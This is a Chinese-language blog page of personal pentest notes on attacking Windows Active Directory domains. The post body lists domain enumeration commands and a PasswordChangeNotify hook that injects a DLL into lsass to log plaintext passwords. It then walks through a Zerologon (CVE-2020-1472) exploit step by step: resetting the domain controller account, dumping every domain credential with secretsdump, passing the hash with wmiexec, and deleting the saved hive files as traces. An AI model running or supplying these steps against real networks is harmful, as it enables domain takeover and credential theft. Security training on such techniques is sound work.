@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>92域 | JohnScott2046的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,网络安全," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott2046</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>92域</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2022-11-01
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="92域"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>网络安全(一)域</p>
+<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><h3 id="Windows-域"><a href="#Windows-域" class="headerlink" title="Windows(域)"></a>Windows(域)</h3><p>获取域用户列表<br>net user /do</p>
+<p>获取域管理员列表<br>net group “domain admins” /domain</p>
+<p>查看域控制器（如果有多台）<br>net group “domain controllers” /domain</p>
+<p>查看域机器<br>net group “domain computers” /domain</p>
+<p>查询域里面的工作组<br>net group /domain</p>
+<p>查询本机管理员,通常含有域用户<br>net localgroup administrators</p>
+<p>查询登陆本机的域管理员<br>net localgroup administrators /domain</p>
+<p>查看同一域内机器列表<br>net view</p>
+<p>查看内网存在多少个域<br>net view /domain</p>
+<p>查看XXX域中的机器列表<br>net view /domain:域</p>
+<p>查询域用户密码过期等信息<br>net accounts /doamin</p>
+<h3 id="nltest查询受信任域"><a href="#nltest查询受信任域" class="headerlink" title="nltest查询受信任域"></a>nltest查询受信任域</h3><p>nltest在windows03以下不是内置的，在windwos03以后的机器都内置有。</p>
+<p>信任域：可以在工作组里查询，查询内网里是否有域环境</p>
+<p>首先查看当前域的DNS服务器<br>ipconfig /all</p>
+<p>查询192.168.1.1的受信任域<br>nltest /domain_trusts /all_trusts /v /server:192.168.1.1[dns的ip]</p>
+<p>0：代表是第一个域，如果有多个，那么会有1,2,3…等等类似</p>
+<p>查询域控和其他信息<br>nltest /dsgetdc:域名 /server:192.168.1.1[域控ip]</p>
+<h3 id="csvde导出域内详细信息"><a href="#csvde导出域内详细信息" class="headerlink" title="csvde导出域内详细信息"></a>csvde导出域内详细信息</h3><p>csvde -setspn [域的名字] -f 文件名.csv</p>
+<p>LDAP的存储规则：一般存储的是域的信息<br>区分名（DN，Distinguished Name）一个条目的区分名称叫做“dn”或者叫做区分名。在一个目录中这个名称总是唯一的<br>CN=Common Nmae 为用户名或服务器名，最长可以到80个字符，可以为中文<br>OU=Organization Unit为组织单元，最多可以有四级，没级最长32个字符，可以为中文<br>O=Organization为组织名，可以3-64个字符长度<br>C=Country为国家名，可选，为2个字符长度</p>
+<h3 id="setspn定位域内所有存活的各类服务器"><a href="#setspn定位域内所有存活的各类服务器" class="headerlink" title="setspn定位域内所有存活的各类服务器"></a>setspn定位域内所有存活的各类服务器</h3><p>SPN官方名称叫做”服务主体名称”，本质上存的就是域内各种服务资源的对应关系，借助SPN可以快速定位当前目标域中所有存活的各类服务器。</p>
+<p>setspn -T [域的名字] -Q <em>/</em></p>
+<p>指定查询：查询MSSQL</p>
+<p>setspn -T [域的名字] -Q <em>/</em> | findstr MSSQL</p>
+<h3 id="dnsdump获取域环境下所有机器对应的IP"><a href="#dnsdump获取域环境下所有机器对应的IP" class="headerlink" title="dnsdump获取域环境下所有机器对应的IP"></a>dnsdump获取域环境下所有机器对应的IP</h3><p>dnsdump工具可以获取域环境下所有机器对应的IP</p>
+<p>下载地址 <a href="https://github.com/dirkjanm/adidnsdump">https://github.com/dirkjanm/adidnsdump</a></p>
+<p>域控制器名可以用setspn命令查看<br>dnsdump.exe -u [域名]\域用户 -p 域密码 域控制器名 -r</p>
+<h3 id="nbtscan获取内网存活主机"><a href="#nbtscan获取内网存活主机" class="headerlink" title="nbtscan获取内网存活主机"></a>nbtscan获取内网存活主机</h3><p>nbtscan.exe 192.168.1.0/24</p>
+<h3 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h3><p>Hook PasswordChangeNotify 的作用是当用户修改密码后在系统中进行同步。</p>
+<p>攻击者可以利用该功能获取用户修改密码时输入的密码明文。</p>
+<p>在修改密码时，用户输入新密码后，LSA 会调用 PasswordFileter 来检查该密码是否符合复杂性要求，如果密码符合要求，LSA 会调用 PasswordChangeNotify，在系统中同步密码</p>
+<p>Hook dll </p>
+<p>下载连接 <a href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a></p>
+<p>使用 VS 2019的开发环境，MFC设置为在静态库中使用MFC编译工程，生成 HookPasswordChange.dll</p>
+<p>下载脚本<br><a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a></p>
+<p>首先需要 Invoke-ReflectivePEInjection.ps1 脚本将 HookPasswordChange.dll 注入内存，在目标系统中启动管理员权限的 Powershell</p>
+<p>Set-ExecutionPolicy bypass<br>Import-Module .\Invoke-ReflectivePEInjection.ps1<br>Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</p>
+<p>这个时候没有报错就说明成功了，最后我们手动改一次域控的密码 Admin123456</p>
+<p>更改成功后，我们在 C:\Windows\Temp 可以找到文件：passwords.txt</p>
+<p>此时可以看到域控的密码为 Admin123456</p>
+<p>如果想要更改 passwords.txt 存放路径的话，那么更改 HookPasswordChange.cpp 代码的 132 行里面的路径</p>
+<h3 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h3><p>CVE-2020-1472是一个windows域控中严重的远程权限提升漏洞，攻击者通过NetLogon，建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限</p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2016<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2019<br>Windows Server 2019 (Server Core installation)<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p>
+<h4 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h4><p>github <a href="https://github.com/dirkjanm/CVE-2020-1472.git">https://github.com/dirkjanm/CVE-2020-1472.git</a></p>
+<h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>查看域控的主机名<br>net group “domain controllers” /domain</p>
+<p>可以看到域控的主机名<br>Krystal</p>
+<p>首先通过 Poc 检测漏洞是否存在<br>python3 cve-2020-1472-poc.py Krystal 目标ip</p>
+<p>使用 exploit 漏洞脚本将域控机器账号重置<br>python3 cve-2020-1472-exploit.py Krystal 192.168.1.200</p>
+<p>之后使用 DCSync 导出域内所有用户的凭证(有四个空格)<br>python3 secretsdump.py Krystal.nc/Krystal$@192.168.1.200    -no-pass</p>
+<p>可以看到域控的Hash<br>Krystal.nc\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7c85389bc79a4eb184e620b6e8c37905</p>
+<p>然后再通过 wmic hash 传递<br>python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7c85389bc79a4eb184e620b6e8c37905 Krystal.nc/Administrator@192.168.1.200</p>
+<p>然后通过导出 sam system 等文件到本地，获取域控机器上本地保存之前的 hash 值用于恢复<br>reg save HKLM\SYSTEM system.save<br>reg save HKLM\SAM sam.save<br>reg save HKLM\SECURITY security.save<br>get system.save<br>get sam.save<br>get security.save </p>
+<p>删除痕迹文件<br>del /f system.save<br>del /f sam.save<br>del /f security.save</p>
+<p>当前机器会生成几个文件：sam.save、security.save、system.save</p>
+<p>通过 sam.save、security.save、system.save  这些文件获得原来域控机器上的 Ntlm Hash 值，用于恢复密码<br>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</p>
+<p>通过拿到 $MACHINE.ACC: 的值，然后进行恢复：注意只有后半部分<br>$MACHINE.ACC: 的值<br>$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:ce7b34c0f2c72d6cb03123ef5ff741ca</p>
+<p>python3 reinstall_original_pw.py Krystal 192.168.1.200 ce7b34c0f2c72d6cb03123ef5ff741ca</p>
+<p>这个时候你还可以使用脚本来检测是否恢复密码成功<br>python3 secretsdump.py Krystal.nc/Krystal$@192.168.1.200 -just-dc-no-pass</p>
+<p>也可以使用这个(有四个空格)<br>python3 secretsdump.py Krystal.nc/Krystal$@192.168.1.200    -no-pass</p>
+
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2022/92%E5%9F%9F/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+              #网络安全
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2022/91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" target="_self">91应急响应</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2022/apk%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" target="_self">Apk测试工具</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
